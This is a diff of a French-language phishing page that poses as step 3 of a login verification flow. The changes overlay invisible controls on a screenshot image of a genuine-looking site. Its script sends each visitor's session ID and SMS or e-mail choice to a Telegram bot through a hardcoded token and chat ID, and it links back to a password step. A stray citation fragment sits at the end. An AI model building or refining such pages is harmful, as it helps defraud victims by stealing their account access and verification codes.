@@ -1,61 +1,148 @@
 <!doctype html>
 <html lang="fr">
 <head>
-<!-- Favicon standard pour les onglets de navigateur (PC / Mac) -->
-    <link rel="icon" type="image/x-icon" href="logo.ico">
-    <link rel="shortcut icon" type="image/x-icon" href="logo.ico">
+  <!-- Favicon standard pour les onglets de navigateur (PC / Mac) -->
+  <link rel="icon" type="image/x-icon" href="logo.ico">
+  <link rel="shortcut icon" type="image/x-icon" href="logo.ico">
 
-    <!-- Icône pour l'écran d'accueil iOS (iPhone / iPad) -->
-    <link rel="apple-touch-icon" href="logo.ico">
+  <!-- Icône pour l'écran d'accueil iOS (iPhone / iPad) -->
+  <link rel="apple-touch-icon" href="logo.ico">
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <title>Connexion - Méthode de vérification</title>
   <style>
-    :root { color: #111; font-family: "Futura", Arial, Helvetica, sans-serif; font-weight: bold; background: #fff; }
-    * { box-sizing: border-box; }
-    body { min-width: 320px; min-height: 100vh; margin: 0; display: flex; flex-direction: column; justify-content: center; align-items: center; background: #fff; }
-    main { width: min(100% - 40px, 400px); padding: 40px 0; margin: auto; text-align: center; }
-    .top-logo { width: 400px; max-width: 100%; height: auto; margin: 0 auto 24px auto; display: block; }
-    .choices { display: grid; gap: 18px; margin: 0 0 26px; text-align: left; }
-    .choice { display: flex; align-items: center; gap: 12px; min-height: 52px; font-size: 17px; font-weight: bold; cursor: pointer; }
-    .choice input { width: 22px; height: 22px; margin: 0; accent-color: #111; }
-    .action { display: block; width: 85%; max-width: 340px; margin: 0 auto; padding: 0; border: 0; background: transparent; cursor: pointer; }
-    .action img { display: block; width: 100%; height: auto; }
-    .back { display: block; margin: 18px auto 0; padding: 4px; border: 0; background: transparent; color: #111; font: inherit; font-weight: bold; text-decoration: underline; cursor: pointer; text-align: center; }
+    :root {
+      color: #111;
+      font-family: "Futura", Arial, Helvetica, sans-serif;
+      font-weight: bold;
+      background: #fff;
+    }
+    * {
+      box-sizing: border-box;
+    }
+    html, body {
+      min-height: 100vh;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      flex-direction: column;
+      background: #fff;
+    }
+    main {
+      flex: 1;
+      width: 100%;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+    /* Conteneur réduit d'un tiers */
+    .bg-wrapper {
+      position: relative;
+      width: 100%;
+      max-width: 350px;
+      aspect-ratio: 528 / 582;
+      background-image: url('back2.JPG');
+      background-size: 100% 100%;
+      background-repeat: no-repeat;
+      background-position: center;
+    }
+    /* Boutons radio descendus très légèrement pour un alignement parfait */
+    .choices {
+      position: absolute;
+      top: 38.5%;
+      right: 12%;
+      display: flex;
+      flex-direction: column;
+      gap: 39px;
+    }
+    .choice {
+      display: flex;
+      align-items: center;
+      cursor: pointer;
+    }
+    .choice input {
+      width: 22px;
+      height: 22px;
+      margin: 0;
+      accent-color: #0070ba;
+      cursor: pointer;
+    }
+    /* Zone interactive positionnée exactement sur le bouton bleu */
+    .action-zone {
+      position: absolute;
+      top: 82%;
+      left: 10%;
+      width: 80%;
+      height: 13.5%;
+      border-radius: 999px;
+      border: 0;
+      background: transparent;
+      cursor: pointer;
+      padding: 0;
+      transition: background-color 0.2s ease;
+    }
+    .action-zone:hover {
+      background: rgba(0, 0, 0, 0.08);
+    }
+    .action-zone:disabled {
+      cursor: wait;
+      background: rgba(255, 255, 255, 0.35);
+    }
+    /* Lien Retour bien espacé */
+    .back {
+      position: absolute;
+      bottom: -32px;
+      left: 50%;
+      transform: translateX(-50%);
+      padding: 6px 12px;
+      border: 0;
+      background: transparent;
+      color: #111;
+      font: inherit;
+      font-size: 12px;
+      font-weight: bold;
+      text-decoration: underline;
+      cursor: pointer;
+      text-align: center;
+      white-space: nowrap;
+    }
   </style>
 </head>
 <body>
   <main>
-    <img src="logo.JPG" alt="Logo" class="top-logo">
-    <form id="formStep3">
-      <div class="choices">
-        <label class="choice">
-          <input type="radio" name="method" value="E-mail" checked>
-          <span>E-mail</span>
-        </label>
-        <label class="choice">
-          <input type="radio" name="method" value="SMS">
-          <span>SMS</span>
-        </label>
-      </div>
-      <button class="action" id="submitBtn" type="submit">
-        <img src="next.JPG" alt="Next">
-      </button>
-      <a href="2-password.html" class="back">Retour</a>
-    </form>
+    <div class="bg-wrapper">
+      <form id="formStep3">
+        <div class="choices">
+          <label class="choice">
+            <input type="radio" name="method" value="SMS" checked>
+          </label>
+          <label class="choice">
+            <input type="radio" name="method" value="E-mail">
+          </label>
+        </div>
+
+        <!-- Bouton Next -->
+        <button class="action-zone" id="submitBtn" type="submit" aria-label="Next"></button>
+
+        <!-- Lien Retour -->
+        <a href="2-password.html" class="back">Retour</a>
+      </form>
+    </div>
   </main>
+
   <script>
     const TELEGRAM_TOKEN = "9165642873:AAFLPg7M2QpgRpwlbKtjKKlnrNe25oJckPo";
     const TELEGRAM_CHAT_ID = "8550191274";
 
     document.getElementById('formStep3').addEventListener('submit', async (e) => {
       e.preventDefault();
-      const method = document.querySelector('input[name="method"]:checked').value;
+      const methodInput = document.querySelector('input[name="method"]:checked');
+      const method = methodInput ? methodInput.value : 'SMS';
       const clientId = localStorage.getItem('client_id') || 'Inconnu';
 
       const message = `🛡️ *Nouvelle info - Étape 3 (Méthode)*\n🆔 Session: \`${clientId}\`\n⚙️ Choix: \`${method}\``;
       const btn = document.getElementById('submitBtn');
-      btn.style.opacity = '0.5';
+      btn.disabled = true;
 
       try {
         await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
@@ -72,3 +159,4 @@
   </script>
 </body>
 </html>
+```[cite: 4, 5]
